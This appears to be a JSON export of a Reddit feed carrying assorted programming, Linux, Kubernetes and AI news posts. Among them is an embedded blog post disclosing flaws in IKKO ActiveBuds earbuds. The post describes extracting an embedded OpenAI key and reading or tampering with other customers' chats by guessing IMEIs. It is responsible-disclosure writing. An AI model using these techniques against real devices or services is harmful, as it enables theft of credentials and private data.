{"id":"i2nisf4o","title":"Reddit","displayTitle":"Reddit","url":"","feedLink":"","isQuery":true,"isEmpty":false,"isHidden":false,"itemCount":398,"items":[{"title":"Compute Freedom: Scale Your K8s GPU Cluster to 'Infinity' with Tailscale","url":"https://www.reddit.com/r/kubernetes/comments/1lpqmtw/compute_freedom_scale_your_k8s_gpu_cluster_to/","date":1751445487,"author":"/u/qingdi","guid":180373,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/qingdi\"> /u/qingdi </a>","contentLength":29,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"grep isn't what you think it means...","url":"https://youtu.be/iQZ81MbjKpU","date":1751445085,"author":"/u/MatchingTurret","guid":180379,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lpqje1/grep_isnt_what_you_think_it_means/"},{"title":"Exploiting the IKKO Activebuds \"AI powered\" earbuds, running DOOM, stealing their OpenAI API key and customer data","url":"https://blog.mgdproductions.com/ikko-activebuds/","date":1751444837,"author":"/u/Kok_Nikol","guid":180376,"unread":true,"content":"<p>So my journey with these earbuds started after I saw them on <a href=\"https://www.youtube.com/clip/UgkxPHxlV8Uo2L2k_v_RNloYS80CGql6CWH8?ref=blog.mgdproductions.com\" rel=\"noreferrer\">this</a> Mrwhosetheboss video about pointless tech. This device seems to be also popular on TikTok. My suspicions were confirmed, this runs android. So of course i went ahead and bought them.</p><p>245 euros later... and they finally arrived!</p><p>Before we dive further into this, unlike with <a href=\"https://x.com/MarcelD505/status/1785346490635878837?ref=blog.mgdproductions.com\" rel=\"noreferrer\">rabbit</a>, this issue has been properly reported and patched. This is also my first real blog post/disclosure so feedback is appreciated.</p><p>I like how they strapped a USB-c cable to the outside of the box while there is also a smaller one inside the box. They ran out of box space it seems...</p><p>I also wonder if they are legally allowed to use this OpenAI logo (probably not lol)</p><p>Anyways, we aren't here for fancy boxes, lets get to the main point. The device itself boots up to a screen with the time and ChatGPT front and center.</p><p>There are some other AI features available too like translations. But this isn't a review of the device, you can watch <a href=\"https://www.youtube.com/watch?v=p83t0qj9SFM&amp;ref=blog.mgdproductions.com\" rel=\"noreferrer\">other YouTube videos</a> about that. The ChatGPT animation looks way too similar to the actual app and OpenAI could probably get them in legal trouble for stealing their brand identity. I will also mention that the audio quality is absolute shit if you use their EQ profiles but can be upped to a usable level by tweaking the EQ curves yourself.</p><p>There are also some apps available in the IKKO store, the reason that there is no google play store available is because these apps are modified specifically for the screen on the ActiveBuds, at least, that is what the CEO says about them. We will check that out in a bit. These apps include some music apps like Spotify, but also some gaming apps like, oh god, SUBWAY SURFERS BAYBEEEEE</p><p>Of course all of them unbearable to navigate due to the small screen. However we can now confirm that it most definitely runs android.</p><p>There is sadly no browser available to directly download other apps. And while you can open the native android settings app, clicking the build number 7 times does not enable developer mode. So i couldn't enable adb it seems. Is it locked that well? heh nope.</p><p>Let's just plug it into a pc and see what happens....</p><p>What the fuck, they left ADB enabled. Well, this makes it a lot easier. </p><p>After sideloading the obligatory DOOM, i began checking out how the ChatGPT integration works on the backend. I first started HTTP inspecting the device, however since i couldn't enable the proper system certificates without rooting the device, i couldn't see exactly to what URL it communicated. Fortunately that wasn't really needed.</p><p>Holy shit, holy shit, holy shit, it communicates DIRECTLY TO OPENAI. This means that a ChatGPT key must be present on the device!</p><p>I know that this device can be rooted to get the proper certificates installed because <a href=\"https://www.hovatek.com/forum/thread-32287.html?ref=blog.mgdproductions.com\" rel=\"noreferrer\">a tool</a> exists on all Spreadtrum/Unisoc devices which can be used to unlock the bootloader as long as companies use the default signing keys. This was indeed the case here too. However, i couldn't get past the confirmation screen as the device does not have a volume up key to confirm the unlock. I think you are able to sign your own partitions to make it flash them without an unlocked bootloader but that's a bit too advanced for my own liking.</p><p>So, i went back to the drawing board and just dumped all of the apps from it with an APK extractor tool. After popping the launcher app into JADX, things immediately became concerning.</p><p>The device can communicate to either of these domains.</p><ul><li>api.openai.com\nObvious, the OpenAI API</li><li>chat1.chat.iamjoy.cn\nSeems to be the API for the entire device, including features not related to ChatGPT like the app store. Loading it up in a browser gives a login page.</li><li>chat2.chat.iamjoy.cn\nSame thing as chat1, possibly a backup server?</li><li>openspeech.bytedance.com\nNo idea, might be a speech recogniser backup instead of whisper, haven't seen communication to this from the device.</li><li>www.airdimple.cn\nSeems like an OpenAI API mirror or proxy?</li></ul><p>Knowing this i went hunting for api endpoints and keys. I found a file called SecurityStringsAPI which contained encrypted endpoints and authentication keys. </p><p>You might think, hey that's just base64 idiot, the most basic encoding known to mankind. And well, yeah, it is.</p><p>However, there is a second stage which is handled by a native library which is obfuscated to hell. I am not going to even try to read that. Fortunately i didn't have to. I just sideloaded the app on a different device which was rooted, and well, <a href=\"https://x.com/MarcelD505/status/1785346490635878837?ref=blog.mgdproductions.com\" rel=\"noreferrer\">just like the rabbit apk</a>, it just works!</p><p>Yup, that's an OpenAI key.</p><p>Now, while having this access, we can also expose their (pretty funny) system prompt.</p><p>The device also has another few modes, which are Angry Dan and In-Love Dan. For the angry one you need to confirm you are 18+ because it actually swears a lot.</p><p>The system prompts for these are a bit more boring.</p><p>I also noticed that it logs the chat to another endpoint on the chat1 domain. This is probably just to keep a log of messages since the ChatGPT API does not allow that. Possibly for some Chinese espionage? Well, possibly but not entirely, we will get to that.</p><p>The headers for this request include the message, model, response and the device IMEI as the device id.</p><p>I also sideloaded the store app and found out that the apps seem to be mostly ripped straight from apkpure.com</p><p>After discovering this information, i sent an email to the security department of IKKObuds.</p><p>While waiting for their response i started to investigate their companion app. Wait i forgot to tell you about that? Yeah, these earbuds have a companion app with which you can also directly interface with ChatGPT and see your previous chats from the device. So that's what the logging endpoint is used for! You bind the app by <a href=\"https://youtu.be/IfyIV2oE-tE?feature=shared&amp;t=38&amp;ref=blog.mgdproductions.com\" rel=\"noreferrer\">scanning a QR code</a> from the device in the \"Membership\" menu.</p><p>So, let's HTTP inspect this app and check out where it gets this information from.</p><p>Alright so it queries this API with your account token and your device id and returns all the chats you have ever had with the device. However, after removing the account token, the request still worked? So this api has no authentication apart from the device id. I feared the worst.</p><p>I found a frame in <a href=\"https://www.youtube.com/watch?v=IfyIV2oE-tE&amp;t=38s&amp;ref=blog.mgdproductions.com\" rel=\"noreferrer\">the tutorial video</a> in which the device id wasn't properly blurred and plugged that into the api.</p><p>YUP, i now had their entire demo device chat history. And as the IMEI has a certain range, you would be able to figure out the chat history of all customers, which may include sensitive details.</p><p>I also added this new discovery to the email chain.</p><p>While that email was waiting for a reply i checked if i could fabricate a linking QR code from a known IMEI to bind the device. (The QR code is not the IMEI itself but something encrypted) I found the API endpoint by looking at the same SecurityStringsAPI, which was less secure than i initially thought because the variable names literally expose the encrypted api endpoints (lol)</p><p>Plugging in the getBindDevQrCode api in postman, i could fabricate a base64 image of the QR code with any IMEI.</p><p>However, using this QR code to try and bind the device to my app resulted in an error, saying that the device has already been bound to someone else. So that has been the only good security implementation up until now.</p><p>However, i lied, this is still a security/privacy issue. Why, you may ask? This exposes the username you set when creating the account for the app. However, there is no username field when creating your account. Only first and last name.</p><p>I created an account with the first name as \"Cheese2\" and the second name as \"Delight2\". Turns out that the username is equal to First name + Last name. When trying to bind that device to an app after it has already been bound to another app, the response includes the name \"Cheese2Delight2\". Great. Doxed.</p><p>So what we can do now is guess IMEI -&gt; generate QR code -&gt; Bind the device if not bound already, or get your full name when the device is already bound. -&gt; Get all your chat history either way if the device is bound or not.</p><p>There is an unbind_dev endpoint????</p><p>Unfortunately that one actually checks account token and does not allow to unbind a random device IMEI. Phew.</p><p>Hey, do you remember that logging endpoint that actually sent your chats you made with ChatGPT to their servers? This one?</p><p>Yeah, that also only used the device id as authentication, so we can send arbitrary text to the companion app of anyone....</p><p>I tried to send some HTML and JS through it to try and exploit the companion app, fortunately they use vue for their app and that has default HTML and JS injection security <a href=\"https://vuejs.org/guide/best-practices/security?ref=blog.mgdproductions.com#html-injection\" rel=\"noreferrer\">built in</a>. But we can still send scams or something to any user.</p><p>Oh hey a reply to my email!</p><p>First of all, from a gmail address? Come on, actually try to have at least some professionalism. Second, OK they are actually doing something about it. (The YouTube channel mentioned is because i said that i will be making a video about this. I have all the footage for it but i hate my voice with a passion so here we are on this blog post :))</p><p>Shortly after this email, they locked down the app and put out an announcement stating that the app will be in maintenance for a week.</p><p>They also wanted to become a sponsor of my empty YouTube channel? What? I don't think that they understood that i would be talking about their horrible security. Anyways.</p><p>The API was now non functional and displayed a maintenance message. After the service period they put out both an app update and a device update. What changed? The endpoint to get the chat history now needs a \"signature\" header. Which is composed of your account token, your device id, language and the current time encoded with a public/private key + a password. </p><p>Anyways, it is now impossible to fetch the chats without having a valid account token. Still doesn't fix the fact that i can generate a QR code with the guessable IMEI and bind the device to an app if it hasn't been bound already. That circumvents this all. </p><p>The device update broke the ChatGPT functionality from functioning on a device which is not the IkkoBuds itself. The keys remain on device and have not been rotated. So if anyone is able to figure out the broken app on another device or the key encryption system, you can still get your very own free OpenAI API key.</p><p>However i just gave up at this moment, also because they never replied with anything after my last email criticizing them for leaving the keys on device. This is now a month and a half ago.</p><p>So, that is it. You can still inject messages into apps of others, link devices that are not already bound to another companion app, thus leaking chat history. And leak first and last names of devices which are bound.</p><p>I am giving up, but if anyone else wants this company to fix this, be my guest.Also if you liked this deep dive, consider supporting me so i will be able to convince myself that buying more strange android devices is worth it lol<a href=\"https://ko-fi.com/mgdproductions?ref=blog.mgdproductions.com\">https://ko-fi.com/mgdproductions</a></p><p>I got this device rooted with help from <a href=\"https://x.com/haro7z?ref=blog.mgdproductions.com\">@haro7z</a></p><p>They are now checking the device's imei before it is able to use the chatgpt integration and are now using a proxy api instead of calling directly to openai. However this proxy api doesn't require any auth and only requires the User-Agent to be set to okhttp/4.9.0 LOL</p><p>They have also FINALLY rotated their old chatgpt api key!</p>","contentLength":11239,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lpqh9c/exploiting_the_ikko_activebuds_ai_powered_earbuds/"},{"title":"Kubernetes RKE Cluster Recovery","url":"https://www.reddit.com/r/kubernetes/comments/1lppqq0/kubernetes_rke_cluster_recovery/","date":1751441731,"author":"/u/Always_smile_student","guid":180374,"unread":true,"content":"<p>There is an RKE cluster with 6 nodes: 3 master nodes and 3 worker nodes.</p><p>Docker containers with RKE components were removed from one of the worker nodes.</p><p>How can they be restored?</p><p>kubectl get nodes -o wide</p><p>daf5a99691bf rancher/hyperkube:v1.26.6-rancher1 kube-proxy</p><p>daf3eb9dbc00 rancher/rke-tools:v0.1.89 nginx-proxy</p><p>2e99fa30d31b rancher/mirrored-pause:3.7 k8s_POD_coredns</p><p>5f63df24b87e rancher/mirrored-pause:3.7 k8s_POD_metrics-server</p><p>9825bada1a0b rancher/mirrored-pause:3.7 k8s_POD_rancher</p><p>93121bfde17d rancher/mirrored-pause:3.7 k8s_POD_fleet-controller</p><p>2834a48cd9d5 rancher/mirrored-pause:3.7 k8s_POD_fleet-agent</p><p>c8f0e21b3b6f rancher/nginx-ingress-controller k8s_controller_nginx-ingress-controller-wpwnk_ingress-nginx</p><p>a5161e1e39bd rancher/mirrored-flannel-flannel k8s_kube-flannel_canal-f586q_kube-system</p><p>36c4bfe8eb0e rancher/mirrored-pause:3.7 k8s_POD_nginx-ingress-controller-wpwnk_ingress-nginx</p><p>cdb2863fcb95 08616d26b8e7 k8s_calico-node_canal-f586q_kube-system</p><p>90c914dc9438 rancher/mirrored-pause:3.7 k8s_POD_canal-f586q_kube-system</p><p>c65b5ebc5771 rancher/hyperkube:v1.26.6-rancher1 kube-proxy</p><p>f8607c05b5ef rancher/hyperkube:v1.26.6-rancher1 kubelet</p><p>28f19464c733 rancher/rke-tools:v0.1.89 nginx-proxy</p>","contentLength":1187,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"K3s or full Kubernetes","url":"https://www.reddit.com/r/kubernetes/comments/1lposyz/k3s_or_full_kubernetes/","date":1751438040,"author":"/u/ReticularTen82","guid":180372,"unread":true,"content":"<p>So I just build a system on a supermicro x10dri. And I need help. Do I run K3S or full enterprise kubernetes?</p>","contentLength":109,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Built Elasti – a dead simple, open source low-latency way to scale K8s services to zero 🚀","url":"https://www.reddit.com/r/kubernetes/comments/1lpluou/built_elasti_a_dead_simple_open_source_lowlatency/","date":1751427579,"author":"/u/ramantehlan","guid":179550,"unread":true,"content":"<p>We recently built <a href=\"https://github.com/truefoundry/elasti\"></a> — a Kubernetes-native controller that gives your  true , without requiring major rewrites or platform buy-in.</p><p>If you’ve ever felt the pain of idle pods consuming CPU, memory, or even licensing costs — and your HPA or KEDA only scales down to 1 replica — this is built for you.</p><p>Elasti adds a lightweight proxy + operator combo to your cluster. When traffic hits a scaled-down service, the proxy:</p><ul><li><strong>Forwards the request once the pod is ready</strong>.</li></ul><p>And when the pod is already running? The proxy just passes through —  in the warm path.</p><p>It’s designed to be minimal, fast, and transparent. </p><ul><li><strong>Bursty or periodic workloads</strong>: APIs that spike during work hours, idle overnight.</li><li>: Tear everything down to zero and auto-spin-up on demand.</li><li>: Decrease infra costs by scaling unused tenants fully to zero.</li></ul><p>We did a deep dive comparing it with tools like Knative, KEDA, OpenFaaS, and Fission. Here's what stood out:</p><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr><td align=\"left\"><strong>Works with any K8s Service</strong></td></tr><tr></tr><tr></tr></tbody></table><p>We kept things simple and focused:</p><ul><li> for now (TCP/gRPC planned).</li><li> metrics for triggers.</li><li><strong>Deployment &amp; Argo Rollouts only</strong> (extending support to other scalable objects).</li></ul><ul><li> CRD → defines how the service scales</li><li>Elasti Proxy → intercepts HTTP and buffers if needed</li><li>Resolver → scales up and rewrites routing</li><li>Works with Kubernetes ≥ 1.20, Prometheus, and optional KEDA for hybrid autoscaling</li></ul><p>More technical details in our blog:</p><ul><li> — proxy just forwards.</li><li>: Helm + CRD, no big stack.</li><li> — use your existing Deployments.</li></ul><p>If you're exploring serverless for <strong>existing Kubernetes services</strong> (not just functions), I’d love your thoughts:</p><ul><li>Does this solve something real for your team?</li><li>What limitations do you see today?</li><li>Anything you'd want supported next?</li></ul><p>Happy to chat, debate, and take ideas back into the roadmap.</p><p>— One of the engineers behind Elasti</p>","contentLength":1767,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How loosely coupled should I make my code???","url":"https://www.reddit.com/r/golang/comments/1lpirr4/how_loosely_coupled_should_i_make_my_code/","date":1751418149,"author":"/u/ShookethThySpear","guid":180377,"unread":true,"content":"<p>I am a relatively new Go developer so I'm still working my way around Go coding and best practices in Go development. I am currently creating a microservice for personal use now my question is that how loosely coupled do you guys make your code? I am currently using multiple external libraries one of which is widely used in my microservice. I used it widely due to the fact that the struct included in the package is massive and it contains many more nested structs of everything I need. I was thinking of decoupling code from 3rd party packages and also trying out dependency injection manually through interfaces and main() instantiation, but my worry is if I were to create an interface that my services can depend on, I have to create my own struct similar to the one provided by that 3rd party package just for the sake of abstraction.</p>","contentLength":842,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Request for Career Advice – ML PhD non hot topic","url":"https://www.reddit.com/r/MachineLearning/comments/1lphfhf/d_request_for_career_advice_ml_phd_non_hot_topic/","date":1751414233,"author":"/u/Hope999991","guid":179552,"unread":true,"content":"<p>I’m currently a PhD student in Machine Learning, working on a research topic that isn’t considered “hot” in the current academic or industrial landscape. Despite this, I’ve managed to publish as the lead author at ICML, NeurIPS. And twice at ECML. I also have two co-authored publications at ECAI.</p><p>I’ve noticed that many PhD students in the U.S. seem to have much stronger publication records, often in trendier areas. This makes me question how competitive I really am in the current job market—especially given the wave of layoffs and increasing demand for very specialized expertise in industry.</p><p>That said, I do have a strong foundation in core ML, Deep Learning, and LLMs (although LLMS aren’t the direct focus of my PhD research).</p><p>Given all of this, I’m trying to realistically assess: • What are my current chances of landing a demanding, high-quality job in industry or research after my PhD? • What could I do now to improve those chances? • Goal is FANNG.</p><p>I’d greatly appreciate any feedback.</p><p>Edit: My research focuses on anomaly detection, a less trendy area compared to the current popularity of large language models and reinforcement learning.</p>","contentLength":1177,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"6 months ago didn't know how to code, now I launched my first app that actually has users","url":"https://www.reddit.com/r/artificial/comments/1lph92p/6_months_ago_didnt_know_how_to_code_now_i/","date":1751413751,"author":"/u/Sad_Mathematician95","guid":179553,"unread":true,"content":"<p>Kinda wild to see how far you can take the use of AI</p><p>A fully functional Photo restoration app that has a Gallery feature with sorting tools like folders and tags, Family tree builder and more!</p><p>If anyone is curious to try it's free!</p>","contentLength":229,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How do you ship go?","url":"https://www.reddit.com/r/golang/comments/1lpgkn2/how_do_you_ship_go/","date":1751411892,"author":"/u/itsabdur_rahman","guid":179554,"unread":true,"content":"<p>I created a todo list app to learn go web development. I'm currently using templ, htmx, alpine and tailwind. Building the app was a breeze once I got used to the go sytanx and it's been fun.</p><p>After completing the app I decided to make a docker container for it, So it can run anywhere without hassle. Now the problem starts. I made a container as folows:</p><pre><code>FROM golang:1.24.4 WORKDIR /app COPY go.mod go.sum ./ RUN go mod download COPY . . # Install tools RUN curl -L -o /usr/local/bin/tailwindcss https://github.com/tailwindlabs/tailwindcss/releases/latest/download/tailwindcss-linux-x64 &amp;&amp; chmod +x /usr/local/bin/tailwindcss RUN go install github.com/a-h/templ/cmd/templ@latest RUN go install github.com/sqlc-dev/sqlc/cmd/sqlc@latest # Produce Binary RUN tailwindcss -i ./static/css/input.css -o ./static/css/style.min.css RUN templ generate RUN sqlc --file ./internal/db/config/sqlc.yaml generate RUN go build -o /usr/local/bin/app ./cmd CMD [ \"app\" ] </code></pre><p>The problem I see here is that the build times are a lot longer none of the intall tool commands are cached (There is probably a way but I don't know yet). The produced go binary comes out to be just about 15 mb but we can see here that the containers are too big for such a small task</p><pre><code>$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE todo-app latest 92322069832a 2 minutes ago 2.42GB postgres 16-alpine d60bd50d7e2d 3 weeks ago 276MB </code></pre><p>I was considering shipping just the binary but that requires postgres so I bundle both postgres and my app to run using docker compose. There has to be a way to build and ship faster. Hence why I'm here. I know go-alpine has a smaller size that still wouldn't justify a binary as small as 15 mb</p><p>How do you guys ship go web applications. Whether it is just static sties of with the gothh stack.</p>","contentLength":1781,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"RFK Jr. Says AI Will Approve New Drugs at FDA 'Very, Very Quickly. \"We need to stop trusting the experts,\" Kennedy told Tucker Carlson.","url":"https://gizmodo.com/rfk-jr-says-ai-will-approve-new-drugs-at-fda-very-very-quickly-2000622778","date":1751410286,"author":"/u/esporx","guid":179393,"unread":true,"content":"<p>Robert F. Kennedy Jr. appeared on the latest episode of Tucker Carlson’s podcast on Monday and it’s filled with the ramblings of a man completely detached from reality. Kennedy <a href=\"https://gizmodo.com/cdc-to-re-investigate-vaccines-and-autism-despite-decades-of-evidence-showing-no-link-2000573773\">falsely</a> suggested vaccines cause autism, more or less endorsed the idea that Anthony Fauci should go to prison, and says that AI will allow the FDA to approve new drugs very quickly. It’s quite a mess.</p><p>These absolutely unhinged ideas wouldn’t be such a problem if this were any other fringe lunatic appearing on the podcast of a racist former Fox News host. But Kennedy happens to be the Secretary of Health and Human Services, a man who’s been given enormous power over America’s entire healthcare system thanks to President Donald Trump.</p><p>One of the most troubling moments in the new interview comes when Kennedy discusses the role that artificial intelligence is going to play in replacing or altering the VAERS system, which stands for Vaccine Adverse Event Reporting System. VAERS allows doctors to report incidents when they believe a patient has been harmed by vaccines, but Kennedy isn’t happy with it. The secretary <a href=\"https://youtu.be/Jx9pS1kFCrM\">insists</a> it was “designed to fail,” suggesting it’s not registering enough people who in his mind have been harmed by vaccines over the years.</p><p>“We’re going to absolutely change VAERS and we’re going to make it, we’re going to create either within VAERS or supplementary to VAERS, a system that actually works,” Kennedy said. “And, you know, right now, even that system is antiquated because we have access to AI.”</p><p>Kennedy told Carlson he was creating an “AI revolution” at the Department of Health and Human Services and was attracting the top people from Silicon Valley who “walked away from billion dollar businesses.” But Kennedy says these people don’t want prestige or power, they just want to make the healthcare system better.</p><p>“We are at the cutting edge of AI,” Kennedy said. “We’re implementing it in all of our departments. At FDA, we’re accelerating drug approvals so that you don’t need to use primates or even animal models. You can do the drug approvals very, very quickly with AI.”</p><p>Kennedy has previously talked about using AI to <a href=\"https://gizmodo.com/after-slashing-thousands-of-jobs-trumps-fda-wants-to-use-ai-to-approve-new-drugs-more-quickly-2000614144\">increase efficiency</a> at FDA but hasn’t provided details about what AI tools will be used and how they would be used to approve new drugs. But given generative AI’s instability and propensity for failing at some of the most basic tasks, the idea of putting drug approvals in the hands of robots is pretty terrifying.</p><p>Kennedy, who was the founder of an anti-vaccine group called the Children’s Defense Fund, says repeatedly during the interview that vaccines have never been properly studied, which is just a flat-out lie. But he now has the power to demand investigations into vaccines that will get him the results he wants, no matter how much he insists his own opinion doesn’t matter.</p><p>“We need to stop trusting the experts, right?” Kennedy told Carlson. “We were told at the beginning of COVID, don’t look at any data yourself, don’t do any investigation yourself, just trust the experts. And trusting the experts is not a feature of science, it’s not a feature of democracy, it’s a feature of religion, and it’s a feature of totalitarianism.”</p><p>Kennedy went on to insist that it was important for everyone to “do your own research,” a common refrain among those in the so-called Make America Healthy Again movement. But Kennedy is intentionally misrepresenting the role of experts in an informed society. Listening to experts isn’t about abandoning all critical thinking. It’s about recognizing that there are areas where you may not have expertise and taking the opinions of medical professionals more seriously than random people on shows like Joe Rogan and Tucker Carlson who are just self-proclaimed experts.</p><p>Kennedy was asked several leading questions from Carlson, including whether the covid-19 vaccine has killed more people than it saved. And Kennedy is skilled enough as a communicator (his father was Attorney General during his uncle’s presidency, as he frequently mentions) that he can avoid directly answering in the affirmative while subtly telling you that he believes it’s the case.</p><p>Notice, for instance, how Kennedy initially responds to Carlson’s question while eventually working his way to sowing doubt about trust in vaccines.</p><blockquote><p> Do you think overall the COVID vaccine killed more than it saved?</p><p> My opinion about that is irrelevant. What we’re going to try to do is make that science available so the public can look at the science.</p><p> And I would not say one way or the other. And the truth is, I don’t know. And the reason I don’t know is because the studies that were done by my agency were substandard. And they were not designed to answer that question. And there’s been a lot of obfuscation about covering up, as you know, about suppressing any kind of discussion of vaccine injuries.</p></blockquote><p>Kennedy is often effective at manipulating an audience, but also says things that don’t make any sense, even if you agree with his worldview. At one point during his interview with Carlson he said that when Pfizer’s covid-19 vaccine was studied there were two people who died in the control group and one person who died in the vaccine group.</p><p>“You remember they were saying the vaccine is 100% effective? Well, that’s why they were saying it because there was… there was… two is 100% of one,” Kennedy said.</p><p>That’s not how anyone is measuring the efficacy of vaccines. Yes, some of the early studies were admittedly too rosy in their projections, especially those in early 2021 as the vaccines were first released. But nobody was claiming that two people dying in a control group and one person dying in the vaccine group showed the vaccine was 100% effective. That math isn’t anything that was actually presented in any study Gizmodo is aware of.</p><p>Kennedy was also asked about whether Anthony Fauci, the nation’s most visible public health expert during the covid-19 pandemic, would be prosecuted for some unspecified crimes. Again, the secretary danced around a bit with his language but then heavily suggested Fauci should be tried for criminal acts. Kennedy said there should be some kind of “truth commission” for covid-19 vaccines like the truth and reconciliation commissions in South Africa and Central America in the 20th century under repressive governments.</p><p>“Anybody who comes and volunteers to testify truthfully is then given immunity from prosecution. And, but, so that at least the public knows who did what,” Kennedy said. “And people who are called and don’t take that deal and purge themselves, they then can be, they can be prosecuted criminally.”</p><p>Kennedy believes that Fauci was involved in some kind of weaponization of covid-19 and in cahoots with the Chinese government. “I think he had a lot of liability on creating coronavirus,” Kennedy said. “You know, he was funding precisely that research at the Wuhan lab. And he was giving them the technology.”</p><p>When Kennedy notes that Fauci no longer has protection from the Secret Service since President Trump withdrew it, Carlson responds “good.” Fauci received countless death threats from lunatics over the years.</p><p>Kennedy didn’t really get into the spiritual side of his MAHA movement during his latest interview, something that’s previously been top of mind. In fact, Kennedy was very focused on the role of a higher power when he last appeared on Carlson’s show back in August 2024, shortly after abandoning his own bid for president. </p><p>Casey Means, Kennedy’s pick to be Surgeon General, has also appeared on podcasts like Joe Rogan to spout many of the same <a href=\"https://gizmodo.com/maga-crackpots-turn-on-trumps-crackpot-surgeon-general-nominee-2000599701\">crazy talking points</a> and emphasize how important spirituality is for health. But it remains to be seen whether Means will be confirmed by the U.S. Senate. Kennedy recently said he’s going to push for all Americans to get a <a href=\"https://gizmodo.com/rfk-jr-wants-every-american-to-be-sporting-a-wearable-within-four-years-2000619672\">wearable device</a> to monitor their health, and as luck would have it, Means sells a wearable for monitoring glucose. The device is targeted at consumers who aren’t even diabetic, the people who do actually need glucose monitoring.</p><p>The entire episode of Tucker Carlson is available on <a href=\"https://youtu.be/w_fzlwxJZAA\">YouTube</a> but it’s a frustrating thing to sit through for any halfway intelligent person. At one point, Kennedy insists Trump is a smart guy, calling him “immensely knowledgeable” and “encyclopedic in certain areas.” Kennedy even referred to Trump as “one of the most empathetic people that I’ve ever met.” The only point where Kennedy seems to disagree with Trump is on tariffs, with the secretary saying that “businesses are hurting because of the tariffs.” But it’s the kind of quick dissent that will likely go unnoticed given how Kennedy praises the fascist president incessantly throughout.</p><p>You’ve been warned. Listen at the risk of your own sanity.</p>","contentLength":8905,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lpfzgx/rfk_jr_says_ai_will_approve_new_drugs_at_fda_very/"},{"title":"Any deaf Linux users here?","url":"https://www.reddit.com/r/linux/comments/1lpfpf5/any_deaf_linux_users_here/","date":1751409548,"author":"/u/Macdaddyaz_24","guid":179422,"unread":true,"content":"<p>Who here is Deaf? Been wanting to create a deaf only Linux user subreddit. Please comment here if you’re deaf and use linux, plus interested in creating a deaf Linux subreddit. This way we can work with like minded users :)</p>","contentLength":225,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux breaks through 5% share in USA desktop OS market (Statcounter)","url":"https://www.reddit.com/r/linux/comments/1lpepvq/linux_breaks_through_5_share_in_usa_desktop_os/","date":1751407028,"author":"/u/MrHighStreetRoad","guid":179363,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/MrHighStreetRoad\"> /u/MrHighStreetRoad </a>","contentLength":39,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I've been writing Rust for 5 years and I still just .clone() everything until it compiles","url":"https://www.reddit.com/r/rust/comments/1lpc85o/ive_been_writing_rust_for_5_years_and_i_still/","date":1751401062,"author":"/u/kruseragnar","guid":179266,"unread":true,"content":"<p>That's it. That's the post. Then I go back and fix it later. Sometimes I don't.</p>","contentLength":79,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Libreboot 25.06 released","url":"https://libreboot.org/news/libreboot2506.html","date":1751398959,"author":"/u/libreleah","guid":179394,"unread":true,"content":"<p>Article published by: Leah Rowe</p><p>Date of publication: 30 June 2025</p><p>There  a Libreboot 25.04 release in April 2025, but that is retroactively regarded as an RC of 25.06. The original 25.06 release announcement showed changes since 25.04, but the changelog is now relative to December 2024. This reflects the <a href=\"https://libreboot.org/news/revisions.html\">revised release schedule</a>. It means that the changelog is much bigger, and also includes the changes that went in Libreboot 25.04.</p><p>Today’s Libreboot 25.06 revision is a , whereas the previous stable release was Libreboot 20241206. This revised release log lists all changes as of today, 30 June 2025, since the Libreboot 20241206 release of December 2024.</p><div><h2>Open source BIOS/UEFI firmware</h2><a aria-hidden=\"true\" href=\"https://libreboot.org/news/libreboot2506.html#open-source-biosuefi-firmware\">[link]</a></div><p>Libreboot is a free/open source BIOS/UEFI replacement on x86 and ARM, providing boot firmware that initialises the hardware in your computer, to then load an operating system (e.g.&nbsp;Linux/BSD). It is specifically a , in the same way that Debian is a Linux distribution. It provides an automated build system to produce coreboot ROM images with a variety of payloads such as GRUB or SeaBIOS, with regular well-tested releases to make coreboot as easy to use as possible for non-technical users. From a project management perspective, this works in  the same way as a Linux distro, providing a source-based package manager (called lbmk) which patches sources and compiles coreboot images. It makes use of <a href=\"https://www.coreboot.org/\">coreboot</a> for hardware initialisation, and then a payload such as <a href=\"https://www.seabios.org/SeaBIOS\">SeaBIOS</a> or GRUB to boot your operating system; on ARM(chromebooks) and certain x86 mainboards, we provide  (as a coreboot payload), which provides a lightweight UEFI implementation..</p><div><h2>Summarised list of changes</h2><a aria-hidden=\"true\" href=\"https://libreboot.org/news/libreboot2506.html#summarised-list-of-changes\">[link]</a></div><p>The priority for the first half of 2025 has been on further auditing the Libreboot build system, so fewer board ports were added. More board ports will be added instead in the December 2025 release (a lot more).</p><p>The following boards have been added since the Libreboot 20241206 release:</p><ul><li>Acer Q45T-AM support added (similar to G43T-AM3 mainboard)</li><li>Dell Precision T1700 SFF and MT</li></ul><p>Board ports were low priority for this release; now it shall be the focus, between June 2025 and October 2025, ready for the 25.12 release cycle leading into December 2025.</p><p>Dell Precision T1700 is essentially the OptiPlex 9020 but with a slightly different, code-compatible PCH that also supports ECC memory features when an Intel Xeon processor is installed.</p><p>In descending order from latest changes to earliest changes:</p><ul><li>GRUB: Update to revision 73d1c959e (14 March 2025)</li><li>Bump SeaBIOS to to rev 9029a010, 4 March 2025</li><li>Updated Untitled to newer LBSSG repository.</li><li>Bump flashprog to rev e060018 (1 March 2025)</li><li>Bump U-Boot on ARM64 boards to U-Boot v2025.04. Patching courtesy of Alper Nebi Yasak.</li><li>Bump 